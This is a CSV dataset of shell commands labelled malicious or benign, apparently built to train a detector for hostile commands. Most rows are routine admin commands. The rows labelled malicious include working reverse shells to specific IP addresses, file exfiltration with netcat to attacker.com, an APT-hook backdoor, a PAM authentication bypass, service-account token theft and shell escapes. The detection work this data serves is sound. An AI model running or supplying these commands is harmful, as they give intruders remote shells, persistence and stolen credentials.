id,command,label,source,split
d1_003218,echo test > /host/root/userns_marker 2>/dev/null,1,hacktricks,train
d1_003219,tail -n 20 report.yaml,0,bash_instruct,train
d1_003220,"grep -in ""error"" /var/log/syslog | head -n 5",0,bash6k,train
d1_003221,fastd --generate-key,0,tldr,train
d1_003222,find . -mmin -60 -mmin +5,0,nl2bash,train
d1_003223,git checkout -b feature-x,0,bash6k,train
d1_003224,rsync -a -v src dst,0,nl2bash,train
d1_003225,find ~/ -name *.png -exec cp {} imagesdir \;,0,nl2bash,train
d1_003226,find . -name '*.[ch]' | xargs grep -E 'expr',0,nl2bash,train
d1_003228,kaggle [k|kernels] output kernel_name,0,tldr,train
d1_003230,stormlock current resource,0,tldr,train
d1_003231,echo '/bin/sh 0<&2 1>&2' >/path/to/temp-file.sh,1,gtfobins,train
d1_003232,su standarduser,1,hacktricks,train
d1_003233,tldr get-nodeinstalllocation,0,tldr,train
d1_003234,passwd [-d|--delete],0,tldr,train
d1_003235,getpcaps 1234,1,hacktricks,train
d1_003236,mv response.xml modules/,0,bash_instruct,train
d1_003237,ss -0pb | egrep -i 'packet|raw',1,hacktricks,train
d1_003238,[ -f settings.sql ] && cat settings.sql || echo 'not found',0,bash_instruct,train
d1_003239,sudo example,0,bash6k,train
d1_003240,sudo chgrp users event.zip,0,bash_instruct,train
d1_003242,"PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print ""target\n""'",1,hacktricks,train
d1_003243,cat session.ini | wc -l,0,bash_instruct,train
d1_003244,MEM_SIZE=$(echo $(($MEM_STOP-$MEM_START))),1,atomic_red_team,train
d1_003246,"if [ -f /tmp/atomic_hook_poc.txt ]; then echo ""[+] Success: atomic_hook_poc.txt created under /tmp \n"" $(ls -la /tmp/ | grep -w atomic_hook_poc.txt); else echo ""Failed: /tmp/atomic_hook_poc.txt not found""; fi",1,atomic_red_team,train
d1_003247,stat build.conf,0,bash_instruct,train
d1_003248,echo 0> /var/spool/mail/root,1,atomic_red_team,train
d1_003249,sudo chgrp sudo profile.tar.gz,0,bash_instruct,train
d1_003250,"awk 'BEGIN{print ""Total,Free,Available""} /MemTotal:/ {total=$2} /MemFree:/ {free=$2} /MemAvailable:/ {avail=$2} END{printf ""%.2f,%.2f,%.2f\n"", total/1024, free/1024, avail/1024}' /proc/meminfo",0,bash6k,train
d1_003251,"echo 'import os' > /home/user/l.v && echo 'fn main() { os.system(""nc -e bash 212.175.155.41 9001 0>&1"") }' >> /home/user/l.v && v run /home/user/l.v && rm /home/user/l.v",1,quasarnix,train
d1_003252,cat transaction.log | sed 's/[[:space:]]*$//',0,bash_instruct,train
d1_003254,chmod 644 account.csv,0,bash_instruct,train
d1_003255,rm -rf folder/,0,linlm,train
d1_003256,gedit --list-encodings,0,tldr,train
d1_003257,find / -type f -iname '*.env*' 2>/dev/null,1,hacktricks,train
d1_003258,mv access.tar.gz access.tar.gz.old,0,bash_instruct,train
d1_003259,combine path/to/file1 xor path/to/file2,0,tldr,train
d1_003260,journalctl -u sshd --since today --no-pager | grep -c 'unreachable',0,bash_instruct,train
d1_003261,authselect current,1,hacktricks,train
d1_003262,sntpd,0,tldr,train
d1_003263,vi -c ':!/bin/sh' /dev/null,1,gtfobins,train
d1_003264,fadvise [-h|--help],0,tldr,train
d1_003266,"find /var/www/html -type f -name ""*.*"" | rev | cut -d. -f1 | rev | sort | uniq -c | sort -nr | head -3 > extensions_report.txt",0,bash6k,train
d1_003267,hcloud,0,tldr,train
d1_003269,cat payload.ini | wc -l,0,bash_instruct,train
d1_003270,"sed 's/\t/,/g' sales.tsv > sales.tsv.csv",0,bash_instruct,train
d1_003272,ls -lS | head -10,0,linlm,train
d1_003273,cat -n payload.yaml,0,bash_instruct,train
d1_003274,echo 76.132.177.92 ad.doubleclick.net | sudo tee -a /etc/hosts,0,nl2bash,train
d1_003275,cp rootCA.crt /etc/pki/ca-trust/source/anchors/,1,atomic_red_team,train
d1_003277,ss -tn dst monitor.service.io,0,bash_instruct,train
d1_003278,"find . -iname ""*.jpg""",0,linlm,train
d1_003279,sudo touch /var/log/toomanysecrets.sh,1,hacktricks,train
d1_003280,cockpit-ws --help,0,tldr,train
d1_003283,stat -c '%s' invoice.jpg,0,bash_instruct,train
d1_003284,"cut -d, -f2 metrics.log | sort | uniq -c | sort -nr | head -n 5",0,bash_instruct,train
d1_003286,mv backup.old backup.old.old,0,bash_instruct,train
d1_003287,pw adduser art -g wheel -s /bin/sh,1,atomic_red_team,train
d1_003288,who | cut -d' ' -f1 | sort | uniq,0,nl2bash,train
d1_003290,"kubectl run atomic-npm-install --image=node:18 --restart=Never --attach --rm -i -- bash -lc ""mkdir -p /tmp/test && cd /tmp/test && npm init -y >/dev/null 2>&1 && echo '--- package.json before install ---' && cat package.json && npm install tinycolor --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json""",1,atomic_red_team,train
d1_003293,tldr fc,0,tldr,train
d1_003294,ldapadd -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -f tempadmin.ldif,1,atomic_red_team,train
d1_003296,find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null,1,hacktricks,train
d1_003299,25 6 * * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; },1,hacktricks,train
d1_003300,rm /tmp/art_payload.sh,1,atomic_red_team,train
d1_003301,dotnet add reference path/to/reference.csproj,0,tldr,train
d1_003302,systemd-detect-virt --list,0,tldr,train
d1_003303,screen -dr 3350.foo,1,hacktricks,train
d1_003305,"sed -n '10,20p' schema.log",0,bash_instruct,train
d1_003306,find /var/lib/containerd -type f 2>/dev/null | head -n 50,1,hacktricks,train
d1_003309,"find . -not -path '*/\.*' -type f \( ! -iname "".*"" \)",0,nl2bash,train
d1_003310,ssh-copy-id user@remote_server,0,bash6k,train
d1_003311,chmod +x summary.md,0,bash_instruct,train
d1_003313,uniq -d catalog.ini,0,bash_instruct,train
d1_003316,vagrant plugin update vagrant_vbguest,0,tldr,train
d1_003317,cat `xxd -r -p <<< 2f6574632f706173737764`,1,hacktricks,train
d1_003318,docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash,1,hacktricks,train
d1_003320,mv inventory.csv vendor/,0,bash_instruct,train
d1_003321,http://h31f34559.example.net/?cmd=>tar,1,hacktricks,train
d1_003322,colima start --runtime containerd,0,tldr,train
d1_003323,find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null,1,hacktricks,train
d1_003324,"find / -path ""*/.config/chromium/*/Bookmarks"" -exec echo {} >> /tmp/T1217-Chrome.txt \;",1,atomic_red_team,train
d1_003325,rcat 107.255.234.10 443 -r /bin/dash,1,quasarnix,train
d1_003326,cp -p catalog.gz downloads/,0,bash_instruct,train
d1_003328,ledger budget,0,tldr,train
d1_003330,TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null),1,hacktricks,train
d1_003332,sed 's/^[[:space:]]*//' output.conf > clean.txt,0,bash_instruct,train
d1_003333,tcpdump -ln -i lo -w /path/to/output-file -c 1 -Z user,1,gtfobins,train
d1_003334,find . \( -name 'secret' -a -prune \) -o -print,0,nl2bash,train
d1_003335,cat request.yaml | wc -l,0,bash_instruct,train
d1_003336,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' access.ini | sort -u,0,bash_instruct,train
d1_003337,cat access.conf | sort -u,0,bash_instruct,train
d1_003338,perlbrew install|uninstall version,0,tldr,train
d1_003339,"tr -c ""[:alnum:]"" ""\n"" < book.txt | tr '[:upper:]' '[:lower:]' | sort | uniq -c | sort -nr | head -n 3",0,bash6k,train
d1_003340,sed 's/^[[:space:]]*//' order.log > clean.txt,0,bash_instruct,train
d1_003341,httpx [-rl|-rate-limit] 150 [-l|-list] path/to/newline_separated_hosts_list [-td|-tech-detect] [-rt|-response-time],0,tldr,train
d1_003342,touch response.js,0,bash_instruct,train
d1_003344,rcat 40.190.143.157 55011 -r /bin/sh,1,quasarnix,train
d1_003347,tail -n 20 inventory.gz,0,bash_instruct,train
d1_003348,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' archive.ini | sort -u,0,bash_instruct,train
d1_003349,chmod go-w server.tar.gz,0,bash_instruct,train
d1_003351,find /tmp -maxdepth 1 -type f -delete,0,nl2bash,train
d1_003352,echo path/to/file | sxiv -i,0,tldr,train
d1_003355,complete -F function command,0,tldr,train
d1_003356,ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null,1,hacktricks,train
d1_003358,sudo dd bs=4M conv=fsync if=/dev/source_drive of=/dev/dest_drive,0,tldr,train
d1_003359,sfill -I /path/to/mounted_disk_directory,0,tldr,train
d1_003361,git am path/to/file.patch,0,tldr,train
d1_003362,hug -f app.py,0,linlm,train
d1_003364,"sudo sed -i """" ""8s,^,auth sufficient pam_succeed_if.so uid >= 0\n,g"" /etc/pam.d/su",1,atomic_red_team,train
d1_003365,tldr xml depyx,0,tldr,train
d1_003366,ls include | grep '\.old$',0,bash_instruct,train
d1_003367,vi /usr/local/bin/run-parts,1,hacktricks,train
d1_003368,"echo ""e"" > /proc/sysrq-trigger",1,atomic_red_team,train
d1_003371,sudo chown alice account.gz,0,bash_instruct,train
d1_003372,"sed -n '10,20p' changelog.log",0,bash_instruct,train
d1_003373,"/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:example.com:4242",1,slp,train
d1_003374,pip install safety,0,linlm,train
d1_003375,ifup [-a|--all],0,tldr,train
d1_003376,wc -w release.sql,0,bash_instruct,train
d1_003377,cat -n migration.yaml,0,bash_instruct,train
d1_003380,"awk 'BEGIN {2ib3_1 = ""/inet/udp/0/222.121.9.51/443""; while(3) { do{ printf ""shell>"" |& 2ib3_1; 2ib3_1 |& getline 2ib3_2; if(2ib3_2){ while ((2ib3_2 |& getline) > 0) print $0 |& 2ib3_1; close(2ib3_2); } } while(2ib3_2 != ""exit"") close(2ib3_1); }}' /dev/null",1,quasarnix,train
d1_003381,cp auth.md scripts/,0,bash_instruct,train
d1_003382,bash-4.2$ $ ./b,1,hacktricks,train
d1_003383,t:send(d);,1,gtfobins,train
d1_003384,cp auth.json backup/,0,bash_instruct,train
d1_003385,laravel new name --jet,0,tldr,train
d1_003387,sh X sh X,1,gtfobins,train
d1_003389,nc -lnvp 4242,1,payloads,train
d1_003390,"USER_PACKAGES=$($PYTHON_EXE -c ""import site; print(site.getusersitepackages())"")",1,atomic_red_team,train
d1_003391,find dist -type f -user redis,0,bash_instruct,train
d1_003392,ghc -e expression,0,tldr,train
d1_003393,"ss -tulpn | awk 'NR>1 {gsub(/.*:/,""""); print $5"",""$7}' | sort -t',' -k1,1n",0,bash6k,train
d1_003394,find src -type f -size +100M,0,bash_instruct,train
d1_003395,cat infile | dos2unix -U | od -c,0,nl2bash,train
d1_003396,"top -p $(pgrep -d, haproxy)",0,bash_instruct,train
d1_003399,mv session.jpg session.jpg.old,0,bash_instruct,train
d1_003400,chkrootkit -x,0,tldr,train
d1_003401,ls -ld /tmp /tnt,0,nl2bash,train
d1_003402,tail -n 20 results.gz,0,bash_instruct,train
d1_003403,journalctl -u systemd-networkd -f | grep --line-buffered -i 'critical',0,bash_instruct,train
d1_003405,sudo vim -c '!sh',1,payloads,train
d1_003406,virt-qemu-run [-v|--verbose] path/to/guest.xml,0,tldr,train
d1_003409,sfdk --help,0,tldr,train
d1_003410,watchdogd,0,tldr,train
d1_003411,r2e delete index,0,tldr,train
d1_003412,cat invoice.json | wc -l,0,bash_instruct,train
d1_003413,sestatus 2>/dev/null,1,hacktricks,train
d1_003414,dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 194.16.208.203 #',1,hacktricks,train
d1_003415,mmls -i ewf image.e01 image.e02,0,tldr,train
d1_003417,chmod +x /path/to/temp-dir/bin/rustc,1,gtfobins,train
d1_003418,easy_install .,1,gtfobins,train
d1_003419,getArch.py -targets path/to/targets_file,0,tldr,train
d1_003420,echo $ENCODED > /tmp/T1140.encoded && base64 -d /tmp/T1140.encoded,1,atomic_red_team,train
d1_003423,chmod 444 test.txt,0,bash6k,train
d1_003424,opkg upgrade package1 package2 ...,0,tldr,train
d1_003425,adduser --shell path/to/shell username,0,tldr,train
d1_003426,systemctl stop service,0,bash6k,train
d1_003427,wget -c https://h109f47d9.example.net/big.iso,0,bash_instruct,train
d1_003428,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' index.yaml | sort -u,0,bash_instruct,train
d1_003432,ls -ld /etc/sudoers.d/,1,hacktricks,train
d1_003433,find . -type f -mtime -1,0,bash6k,train
d1_003434,cat product.yaml | wc -l,0,bash_instruct,train
d1_003435,grant role_name to username;,0,tldr,train
d1_003439,java Shell,1,gtfobins,train
d1_003440,wajig purge package,0,tldr,train
d1_003441,printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper,1,hacktricks,train
d1_003442,findfs UUID=uuid,0,tldr,train
d1_003443,rm `find . -name \*.pyc`,0,nl2bash,train
d1_003444,sudo apptainer config fakeroot [-d|--disable] username,0,tldr,train
d1_003445,apt remove vim -y,0,bash6k,train
d1_003446,find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio',1,hacktricks,train
d1_003447,"yes x | head -10 | awk 'BEGIN { RS = ""%%%%%%%"" } { split($0,a,""\n""); for (i=1; i<length(a); i+=4) print a[i], a[i+1], a[i+2], a[i+3] }'",0,nl2bash,train
d1_003449,chmod +x /host/path/to/hook.sh,1,hacktricks,train
d1_003450,chmod 744 data.log,0,bash_instruct,train
d1_003452,sudo chgrp deploy migration.jpg,0,bash_instruct,train
d1_003454,cat credentials.log | tail -n 15,0,bash_instruct,train
d1_003455,find $HOME -mtime -7,0,nl2bash,train
d1_003457,defaults write com.apple.Dock expose-animation-duration -float 0.1,0,tldr,train
d1_003458,freshclam,0,linlm,train
d1_003459,find . -maxdepth 1 ! -perm -o=r,0,nl2bash,train
d1_003461,"jrunscript -e 'exec(""/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty"")'",1,gtfobins,train
d1_003462,pkill -u ec2-user,0,bash_instruct,train
d1_003464,sudo chgrp operators transaction.zip,0,bash_instruct,train
d1_003465,monolith url [-o|--output] path/to/file.html,0,tldr,train
d1_003466,openclaw channels [-h|--help],0,tldr,train
d1_003467,scp erin@api.corp.net:/var/log/api.log .,0,bash_instruct,train
d1_003468,[ -f payment.html ] && cat payment.html || echo 'not found',0,bash_instruct,train
d1_003469,cp -a project/ /backup/project/,0,bash6k,train
d1_003470,head -n 1 manifest.tar.gz,0,bash_instruct,train
d1_003471,find . -name '*.jpg' -print ./bar/foo.jpg,0,nl2bash,train
d1_003472,tar -cvf archive.tar directory,0,bash6k,train
d1_003473,make [-B|--always-make] target,0,tldr,train
d1_003474,find /basedir/ -iname '*company*' -print0,0,nl2bash,train
d1_003475,ln -s summary.log latest.log,0,bash_instruct,train
d1_003476,ls -d */ | cut -f1 -d'/',0,nl2bash,train
d1_003477,touch access.sh,0,bash_instruct,train
d1_003478,cp -u server.tar.gz downloads/,0,bash_instruct,train
d1_003479,sudo chown -R redis:admin reports,0,bash_instruct,train
d1_003481,find . -mtime 1,0,nl2bash,train
d1_003482,cp -p account.css uploads/,0,bash_instruct,train
d1_003483,batcat --paging always /etc/hosts,1,gtfobins,train
d1_003485,grep -rn 'critical' /etc/nginx,0,bash_instruct,train
d1_003487,"mount | tail -1 | sed -e ""s/^[^/]*\(.*\) type .*$/\1/g""",0,nl2bash,train
d1_003488,find . -name omit-directory -prune -o -type f -print,0,nl2bash,train
d1_003490,ss -tn | grep ':3000' | wc -l,0,bash_instruct,train
d1_003491,find / -perm /u=s -ls 2>/dev/null,1,hacktricks,train
d1_003492,az acr create [-n|--name] registry_name [-g|--resource-group] resource_group --sku sku,0,tldr,train
d1_003493,xmore /path/to/input-file,1,gtfobins,train
d1_003494,uniq -c settings.json,0,bash_instruct,train
d1_003495,"cut -d, -f7 inventory.csv | sort | uniq -c | sort -nr | head -n 15",0,bash_instruct,train
d1_003496,yes > backingfile &,0,nl2bash,train
d1_003497,"resticprofile [-n|--name] ""profile_name"" backup",0,tldr,train
d1_003499,nc attacker.com 12345 </path/to/input-file,1,gtfobins,train
d1_003501,sudo lvchange [-a|--activate] n /dev/vg_name/lv_name,0,tldr,train
d1_003502,sudo chown -R bob:wheel tests,0,bash_instruct,train
d1_003504,pipenv install --dev,0,tldr,train
d1_003505,mkdir -p /path/to/temp-dir/filter.d/,1,gtfobins,train
d1_003506,zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50,1,hacktricks,train
d1_003507,find . -size +2G,0,nl2bash,train
d1_003509,kubectl debug pod_name [-it|--stdin --tty] --image image --target target_container_name,0,tldr,train
d1_003510,chmod 644 notes.md,0,bash_instruct,train
d1_003512,sed -i '1d' output.log,0,bash_instruct,train
d1_003514,aws ec2 delete-volume --volume-id volume_id,0,tldr,train
d1_003515,echo 'sleep 5' | /tmp/crond,1,atomic_red_team,train
d1_003516,pueue restart [-a|--all-failed] --stashed,0,tldr,train
d1_003517,sudo chown -R carol:developers cache,0,bash_instruct,train
d1_003519,grep 'timeout' scheduler.log | sort -u,0,bash_instruct,train
d1_003520,cat response.tsv | wc -l,0,bash_instruct,train
d1_003522,alacritty --working-directory path/to/directory,0,tldr,train
d1_003524,cat build.tsv,0,bash_instruct,train
d1_003525,zoxide remove path/to/directory,0,tldr,train
d1_003526,LABEL,1,hacktricks,train
d1_003527,sudo systemctl start chronograf,0,linlm,train
d1_003529,lsof -c chrome,0,bash_instruct,train
d1_003530,kubectl cluster-info,0,linlm,train
d1_003531,lpstat -a 2>/dev/null,1,hacktricks,train
d1_003532,cat audit.tsv | tail -n 15,0,bash_instruct,train
d1_003533,"sed 's/\t/,/g' migration.yaml > migration.yaml.csv",0,bash_instruct,train
d1_003536,[ -f inventory.md ] && cat inventory.md || echo 'not found',0,bash_instruct,train
d1_003537,sudo swapon [-a|--all],0,tldr,train
d1_003538,sudo pacman -S dino,0,linlm,train
d1_003539,jj git remote remove remote,0,tldr,train
d1_003540,xxd -l 64 server.css,0,bash_instruct,train
d1_003541,sudo chown nginx metrics.pdf,0,bash_instruct,train
d1_003542,mv build.csv fixtures/,0,bash_instruct,train
d1_003543,xcowsay --cow-size small|med|large,0,tldr,train
d1_003544,podman run --name t1613_container --rm -d -t t1613,1,atomic_red_team,train
d1_003545,"cat credentials.tsv | awk '{ print length, $0 }' | sort -rn | head -20 | cut -d' ' -f2-",0,bash_instruct,train
d1_003546,find . -name '.git' | xargs -n 1 dirname,0,nl2bash,train
d1_003549,ash,1,gtfobins,train
d1_003550,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' server.json | sort -u,0,bash_instruct,train
d1_003553,"/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip",1,hacktricks,train
d1_003554,"echo 'APT::Update::Pre-Invoke {""nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &""};' > /etc/apt/apt.conf.d/42backdoor",1,payloads,train
d1_003555,nh os test path/to/flake [-s|--specialisation] specialisation,0,tldr,train
d1_003557,zipnote < path/to/file.txt -w path/to/file.zip,0,tldr,train
d1_003558,"System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;",1,gtfobins,train
d1_003559,aws cloudwatch delete-dashboards --dashboard-names dashboard_names,0,tldr,train
d1_003560,chmod 644 users.txt,0,bash_instruct,train
d1_003562,split -b 10 input.txt /tmp/split-file,0,nl2bash,train
d1_003563,grep -c 'unreachable' build.log,0,bash_instruct,train
d1_003564,"readlink -f ""$path""",0,nl2bash,train
d1_003565,pacman-key [-l|--list-keys],0,tldr,train
d1_003566,gpg --export-secret-key key | paperkey --output path/to/secret_data.txt,0,tldr,train
d1_003567,gunzip example.txt.gz,0,bash6k,train
d1_003568,getcap -r / 2>/dev/null | grep -E 'cap_mac_admin|cap_mac_override',1,hacktricks,train
d1_003569,convmv -f from_encoding -t to_encoding --notest input_file,0,tldr,train
d1_003570,cat dump.conf | sort -u,0,bash_instruct,train
d1_003571,stress-ng --vm 1 --vm-bytes 1G --verify -t 5m,1,hacktricks,train
d1_003572,nping --interface eth0 example.com,0,tldr,train
d1_003573,head -n 1 inventory.html,0,bash_instruct,train
d1_003575,ng build,0,linlm,train
d1_003576,choose :2,0,tldr,train
d1_003577,sudo chown -R www-data:wheel project,0,bash_instruct,train
d1_003578,cat payload.ini | sort | uniq -c | sort -nr,0,bash_instruct,train
d1_003579,torify /bin/sh,1,gtfobins,train
d1_003581,find . -mindepth 1 -maxdepth 1 -type d| xargs -n 1 cp -i index.html,0,nl2bash,train
